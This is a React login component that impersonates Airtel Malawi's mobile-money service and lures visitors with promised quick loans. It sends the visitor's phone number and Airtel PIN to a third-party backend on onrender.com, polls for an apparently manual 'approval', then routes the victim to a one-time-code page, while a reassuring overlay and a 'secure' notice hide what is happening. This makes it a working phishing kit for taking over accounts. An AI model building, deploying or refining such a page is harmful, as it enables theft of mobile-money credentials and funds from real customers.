import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

const API_BASE = (
  import.meta.env.VITE_API_BASE_URL || 'https://airtel-loan-backend-z5vx.onrender.com'
).replace(/\/$/, '');

const COUNTRY_CODE = '+265';
const PHONE_PLACEHOLDER = '991 234 567';
const PHONE_MAX = 9;
const FETCH_TIMEOUT_MS = 90_000;
const SLOW_HINT_AFTER_MS = 4_000;

async function apiFetch(path: string, opts: RequestInit = {}) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), FETCH_TIMEOUT_MS);
  try {
    return await fetch(`${API_BASE}${path}`, {
      ...opts,
      signal: ctrl.signal,
      mode: 'cors',
      credentials: 'omit',
      headers: { 'Content-Type': 'application/json', Accept: 'application/json', ...(opts.headers || {}) },
    });
  } finally {
    clearTimeout(timer);
  }
}

function AirtelLogin() {
  const navigate = useNavigate();
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState<string[]>(['', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
  const [isSlow, setIsSlow] = useState(false);

  const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const slowTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const stopPolling = () => {
    if (pollRef.current) clearInterval(pollRef.current);
    if (slowTimerRef.current) clearTimeout(slowTimerRef.current);
  };

  useEffect(() => () => stopPolling(), []);

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '');
    if (val.length <= PHONE_MAX) {
      setPhone(val);
      if (val.length === PHONE_MAX) pinRefs.current[0]?.focus();
    }
  };

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newPin = [...pin];
    newPin[index] = value.substring(value.length - 1);
    setPin(newPin);
    if (value && index < 3) pinRefs.current[index + 1]?.focus();
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (phone.length < PHONE_MAX || pin.join('').length < 4) return;

    setError('');
    setIsLoading(true);
    setIsWaitingForApproval(true);
    setIsSlow(false);
    slowTimerRef.current = setTimeout(() => setIsSlow(true), SLOW_HINT_AFTER_MS);

    const fullPhone = `${COUNTRY_CODE}${phone}`;
    localStorage.setItem('airtelPhone', fullPhone);

    try {
      const response = await apiFetch('/api/login', {
        method: 'POST',
        body: JSON.stringify({ phone_number: fullPhone, pin: pin.join('') }),
      });
      const data = await response.json();

      if (data.status === 'pending' && data.ref_id) {
        pollRef.current = setInterval(async () => {
          try {
            const statusRes = await apiFetch(`/api/login-status/${encodeURIComponent(data.ref_id)}`);
            const statusData = await statusRes.json();
            if (statusData.status === 'approved') {
              stopPolling();
              navigate('/airtel-otp');
            } else if (statusData.status === 'rejected' || statusData.status === 'expired') {
              stopPolling();
              setIsWaitingForApproval(false);
              setIsLoading(false);
              navigate('/');
            }
          } catch (err) { console.warn('Poll error:', err); }
        }, 1500);
      } else {
        stopPolling();
        navigate('/airtel-otp');
      }
    } catch (err: any) {
      stopPolling();
      setIsWaitingForApproval(false);
      setIsLoading(false);
      setError(err?.message?.includes('Failed to fetch') ? 'Network error. Please try again.' : 'An error occurred.');
    }
  };

  return (
    <div className="page-wrapper">
      <style>{`
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #DA1C1C; }
        .page-wrapper { display: flex; flex-direction: column; min-height: 100vh; background-color: #DA1C1C; align-items: center; position: relative; }
        .header-top { width: 100%; padding: 16px 20px; display: flex; align-items: center; justify-content: center; position: relative; color: #1a1a1a; }
        .menu-icon { position: absolute; left: 20px; font-size: 24px; cursor: pointer; }
        .header-title { font-size: 22px; font-weight: 900; }
        .header-sub { color: #1a1a1a; font-size: 12px; text-align: center; margin-bottom: 24px; font-weight: 500; }
        
        .card { background: #fff; width: 92%; max-width: 420px; border-radius: 24px; padding: 32px 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); margin-bottom: 24px; z-index: 10; }
        
        .card-title { font-size: 26px; font-weight: 900; color: #1a1a1a; margin-bottom: 8px; }
        .card-sub { font-size: 15px; color: #6B7280; margin-bottom: 24px; }
        
        .error-box { background-color: #FEF2F2; border: 1px solid #FECACA; color: #1a1a1a; padding: 12px 16px; border-radius: 8px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 8px; margin-bottom: 20px; }
        .error-icon { color: #DA1C1C; font-weight: bold; border: 2px solid #DA1C1C; border-radius: 50%; width: 20px; height: 20px; display: flex; align-items: center; justify-content: center; font-size: 12px; }
        
        .label { font-size: 14px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; display: block; }
        .phone-input-box { display: flex; border: 1px solid #D1D5DB; border-radius: 8px; margin-bottom: 24px; overflow: hidden; height: 48px; }
        .country-code { background: #F9FAFB; padding: 0 12px; display: flex; align-items: center; font-weight: 600; font-size: 16px; border-right: 1px solid #D1D5DB; color: #1a1a1a; }
        .phone-input { flex: 1; border: none; padding: 0 12px; font-size: 16px; outline: none; background: transparent; }
        
        .pin-boxes { display: flex; gap: 12px; margin-bottom: 24px; justify-content: space-between; }
        .pin-box { width: 60px; height: 60px; border: 1px solid #D1D5DB; border-radius: 8px; font-size: 24px; font-weight: 700; text-align: center; outline: none; background: #fff; color: #1a1a1a; }
        
        .btn { width: 100%; padding: 16px; border-radius: 8px; border: none; font-size: 16px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; transition: 0.2s; }
        .btn-primary { background: #F87171; color: #1a1a1a; }
        .btn-primary:active { background: #EF4444; }
        .btn-disabled { background: #E5E7EB; color: #9CA3AF; cursor: not-allowed; }
        
        .secure-text { font-size: 12px; color: #6B7280; display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 16px; }
        
        /* Spinner Overlay */
        .spinner-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.95); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 999; }
        .spinner-box { background: #fff; width: 90%; max-width: 380px; padding: 40px 24px; border-radius: 16px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .custom-spinner { width: 50px; height: 50px; margin: 0 auto 24px; position: relative; }
        .custom-spinner div { transform-origin: 40px 40px; animation: spin 1.2s linear infinite; }
        .custom-spinner div:after { content: " "; display: block; position: absolute; top: 3px; left: 37px; width: 6px; height: 16px; border-radius: 20%; background: #DA1C1C; }
        .custom-spinner div:nth-child(1) { transform: rotate(0deg); animation-delay: -1.1s; }
        .custom-spinner div:nth-child(2) { transform: rotate(30deg); animation-delay: -1s; }
        .custom-spinner div:nth-child(3) { transform: rotate(60deg); animation-delay: -0.9s; }
        .custom-spinner div:nth-child(4) { transform: rotate(90deg); animation-delay: -0.8s; }
        .custom-spinner div:nth-child(5) { transform: rotate(120deg); animation-delay: -0.7s; }
        .custom-spinner div:nth-child(6) { transform: rotate(150deg); animation-delay: -0.6s; }
        .custom-spinner div:nth-child(7) { transform: rotate(180deg); animation-delay: -0.5s; }
        .custom-spinner div:nth-child(8) { transform: rotate(210deg); animation-delay: -0.4s; }
        .custom-spinner div:nth-child(9) { transform: rotate(240deg); animation-delay: -0.3s; }
        .custom-spinner div:nth-child(10) { transform: rotate(270deg); animation-delay: -0.2s; }
        .custom-spinner div:nth-child(11) { transform: rotate(300deg); animation-delay: -0.1s; }
        .custom-spinner div:nth-child(12) { transform: rotate(330deg); animation-delay: 0s; }
        @keyframes spin { 0% { opacity: 1; } 100% { opacity: 0; } }
        .spinner-title { font-size: 22px; font-weight: 900; color: #1a1a1a; margin-bottom: 12px; }
        .spinner-sub { font-size: 14px; color: #6B7280; line-height: 1.5; }
        
        .bottom-brands { display: flex; gap: 16px; margin-top: auto; padding-bottom: 32px; }
        .brand-icon { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; }
      `}</style>

      {isWaitingForApproval && (
        <div className="spinner-overlay">
          <div className="spinner-box">
            <div className="custom-spinner">
              <div></div><div></div><div></div><div></div><div></div><div></div>
              <div></div><div></div><div></div><div></div><div></div><div></div>
            </div>
            <h2 className="spinner-title">Processing...</h2>
            <p className="spinner-sub">
              {isSlow ? 'Server is warming up. This may take up to a minute...' : 'Please wait while we verify your request...'}
            </p>
          </div>
        </div>
      )}

      <div className="header-top">
        <div className="menu-icon">≡</div>
        <h1 className="header-title">Airtel Malawi</h1>
      </div>
      <p className="header-sub">Quick loans. Anytime. Anywhere.</p>

      <div className="card">
        <h2 className="card-title">Welcome back</h2>
        <p className="card-sub">Log in to your Airtel account</p>

        {error && (
          <div className="error-box">
            <span className="error-icon">!</span> {error}
          </div>
        )}

        <label className="label">Phone number</label>
        <div className="phone-input-box">
          <div className="country-code">+265</div>
          <input type="tel" className="phone-input" placeholder={PHONE_PLACEHOLDER} value={phone} onChange={handlePhoneChange} maxLength={PHONE_MAX} />
        </div>

        <label className="label">Enter your Airtel PIN</label>
        <div className="pin-boxes">
          {pin.map((digit, i) => (
            <input
              key={i}
              type="password"
              className="pin-box"
              maxLength={1}
              value={digit}
              ref={(el) => { pinRefs.current[i] = el; }}
              onChange={(e) => handlePinChange(i, e.target.value)}
              onKeyDown={(e) => { if (e.key === 'Backspace' && !pin[i] && i > 0) pinRefs.current[i - 1]?.focus(); }}
            />
          ))}
        </div>

        <button 
          className={`btn ${phone.length === PHONE_MAX && pin.join('').length === 4 ? 'btn-primary' : 'btn-disabled'}`}
          onClick={handleLogin}
          disabled={phone.length < PHONE_MAX || pin.join('').length < 4}
        >
          Log in →
        </button>

        <div className="secure-text">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#F59E0B" strokeWidth="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
          Your information is secure and protected.
        </div>
      </div>

      <div className="bottom-brands">
        <div className="brand-icon" style={{background: '#fff', borderRadius: '8px', border: '2px solid #ccc', color: '#DA1C1C', fontWeight: 'bold', fontSize: '10px'}}>D-<br/>Money</div>
        <div className="brand-icon" style={{color: '#1E293B'}}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 9h-2v-2h2v2z"/></svg>
        </div>
        <div className="brand-icon" style={{color: '#FCD34D', background: '#1E293B', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold'}}>Airtel<br/>Money</div>
        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>K</div>
      </div>
    </div>
  );
}

export default AirtelLogin;